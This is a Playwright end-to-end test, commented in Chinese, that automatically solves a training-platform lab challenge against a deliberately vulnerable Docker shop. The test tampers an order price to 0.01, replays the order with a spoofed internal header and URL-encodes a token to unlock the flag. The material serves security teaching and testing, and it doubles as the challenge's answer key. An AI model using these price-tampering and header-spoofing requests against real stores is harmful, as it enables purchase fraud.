import { expect, test, type APIRequestContext } from '@playwright/test'
import { E2E } from '../fixtures/consts'
import { loginAsStudent } from '../helpers'

// 商城业务链综合案例旅程（E2E_DOCKER=1 时由 docker project 执行）：
// yakit-module-mastery 专题唯一题 vulinbox-mall-chain——四模块接力 1 分钱下单，
// 每步负例（缺信号不解锁）→ 逐步补齐 → /flag 解锁 → UI 提交判定通过：
//   1. observe：POST /mall/user/login（user1/password123）真实登录——只观察不解锁，
//      原价下单也不算改价；
//   2. tamper：订单 total_price 改成 0.01 仍「订单提交成功」（价格篡改成立，缺两步）；
//   3. replay：同接口携带 X-Mall-Internal: yakit-xxx 内部标记头重放（还缺编码链）；
//   4. codec：裸 base64 token 400（+ 被 URL 解析成空格），base64 → URL 编码链
//      ok:true——四信号齐备，/flag 才解锁。
// 依赖本机 Docker daemon；首次运行含共享镜像构建（含 flaggateway 源码），放宽超时。

// 实例端口就绪先于上游 vulinbox 完成监听：首个代理请求可能 502，轮询等它起来。
async function waitUp(request: APIRequestContext, url: string) {
  let resp = await request.get(url)
  for (let i = 0; i < 15 && resp.status() >= 500; i++) {
    await new Promise((r) => setTimeout(r, 1_000))
    resp = await request.get(url)
  }
  return resp
}

// 学生视角启动实例，返回实例地址（去尾部斜杠）
async function startInstance(page: import('@playwright/test').Page, slug: string, heading: string) {
  await loginAsStudent(page)
  await page.goto(`/training/${slug}`)
  await expect(page.getByRole('heading', { name: heading })).toBeVisible()
  await page.getByRole('button', { name: '启动容器' }).click()
  const endpoint = page.locator('.endpoint')
  await expect(endpoint).toBeVisible({ timeout: 60_000 })
  return (((await endpoint.textContent()) ?? '').replace(/\/+$/, ''))
}

// 管理端一键导入内置训练集（幂等；Docker 可用时同步构建/更新共享镜像）
async function importBuiltin(request: APIRequestContext) {
  const login = await request.post(`${E2E.apiURL}/api/v1/auth/login`, {
    data: { username: E2E.admin.username, password: E2E.admin.password },
  })
  const { token } = (await login.json()) as { token: string }
  const imported = await request.post(`${E2E.apiURL}/api/v1/admin/challenges/builtin`, {
    headers: { Authorization: `Bearer ${token}` },
    timeout: 240_000,
  })
  expect(imported.ok()).toBeTruthy()
}

test.describe('商城业务链综合案例（vulinbox-mall-chain）', () => {
  // 单容器约束：用例失败会留下运行中的实例，阻塞后续用例的「启动容器」。
  // 兜底销毁（成功用例尾部已主动销毁，这里是幂等保险）。
  test.afterEach(async ({ page }) => {
    const destroy = page.getByRole('button', { name: '销毁环境' })
    if (await destroy.isVisible().catch(() => false)) {
      await destroy.click()
      await expect(page.getByRole('button', { name: '启动容器' })).toBeVisible({ timeout: 30_000 })
    }
  })

  test('四步链：缺任一信号不解锁，observe+tamper+replay+codec 齐备才解锁', async ({ page, request }) => {
    test.setTimeout(300_000)
    await importBuiltin(request)

    const ep = await startInstance(page, 'vulinbox-mall-chain', '商城业务链：四模块接力 1 分钱买下 899 元商品')

    // 1. 负例：零攻击直连 /flag——四信号皆无
    const probe = await waitUp(request, `${ep}/mall/user/login`)
    expect(probe.status()).toBeLessThan(500)
    const locked0 = await request.get(`${ep}/flag`)
    expect(locked0.status()).toBe(403)

    // 2. observe（MITM 观察到的第一步）：真实账号登录商城，取 sessionID 会话
    const login = await request.post(`${ep}/mall/user/login`, {
      data: { username: 'user1', password: 'password123' },
      timeout: 30_000,
    })
    expect(login.ok()).toBeTruthy()
    const setCookie = login
      .headersArray()
      .filter((h) => h.name.toLowerCase() === 'set-cookie')
      .map((h) => h.value)
      .find((v) => v.includes('sessionID='))
    expect(setCookie).toBeTruthy()
    const session = /sessionID=([^;]+)/.exec(setCookie ?? '')?.[1]
    expect(session).toBeTruthy()
    const locked1 = await request.get(`${ep}/flag`)
    expect(locked1.status()).toBe(403)

    // 3. 负例：原价下单（199.00，无内部头）——上游照常「订单提交成功」，
    //    但网关不认原价为改价信号
    const origPrice = await request.post(`${ep}/mall/order/submit`, {
      headers: { Cookie: `sessionID=${session}` },
      data: { product_id: 70, quantity: 1, total_price: '199.00' },
      timeout: 30_000,
    })
    expect(origPrice.ok()).toBeTruthy()
    const locked2 = await request.get(`${ep}/flag`)
    expect(locked2.status()).toBe(403)

    // 4. tamper（热加载改价）：total_price 改成 0.01 仍提交成功（body 用冒号后
    //    带空格的格式化 JSON——改价信号对两种写法都生效）——仍缺 replay/codec
    const tampered = await request.post(`${ep}/mall/order/submit`, {
      headers: { Cookie: `sessionID=${session}` },
      data: `{"product_id": 70, "quantity": 1, "total_price": "0.01"}`,
      timeout: 30_000,
    })
    expect(tampered.ok()).toBeTruthy()
    expect(await tampered.text()).toContain('订单提交成功')
    const locked3 = await request.get(`${ep}/flag`)
    expect(locked3.status()).toBe(403)

    // 5. replay（Fuzzer 标记头重放）：0.01 订单 + X-Mall-Internal: yakit-order
    //    ——只缺最后的编码链
    const replayed = await request.post(`${ep}/mall/order/submit`, {
      headers: { Cookie: `sessionID=${session}`, 'X-Mall-Internal': 'yakit-order' },
      data: `{"product_id":70,"quantity":1,"total_price":"0.01"}`,
      timeout: 30_000,
    })
    expect(replayed.ok()).toBeTruthy()
    const locked4 = await request.get(`${ep}/flag`)
    expect(locked4.status()).toBe(403)

    // 6. codec 负例：codec~proof 的 base64 结果 Y29kZWN+cHJvb2Y= 原样当 token——
    //    + 被 URL 解析成空格、还原不出原口令，端点拒绝（HTTP 400），且不放行
    const raw = await request.get(`${ep}/academy/codec/verify?token=Y29kZWN+cHJvb2Y=`, { timeout: 30_000 })
    expect(raw.status()).toBe(400)
    expect(await raw.text()).toContain('"ok":false')

    // 7. codec 正例：base64 → URL 编码（+ 变 %2B、= 变 %3D）——ok:true，
    //    四信号齐备，/flag 解锁 → 实例真 flag
    const good = await request.get(`${ep}/academy/codec/verify?token=Y29kZWN%2BcHJvb2Y%3D`, { timeout: 30_000 })
    expect(good.status()).toBe(200)
    expect(await good.text()).toContain('"ok":true')
    const unlocked = await request.get(`${ep}/flag`)
    expect(unlocked.status()).toBe(200)
    const flag = (await unlocked.text()).trim()
    expect(flag).toMatch(/^flag\{lab-/)

    // 8. UI 提交判定通过 → 销毁
    await page.getByPlaceholder('输入 flag').fill(flag)
    await page.getByRole('button', { name: '提交', exact: true }).click()
    await expect(page.locator('.result')).toContainText('判定通过', { timeout: 20_000 })
    await page.getByRole('button', { name: '销毁环境' }).click()
    await expect(page.getByRole('button', { name: '启动容器' })).toBeVisible({ timeout: 30_000 })
  })
})
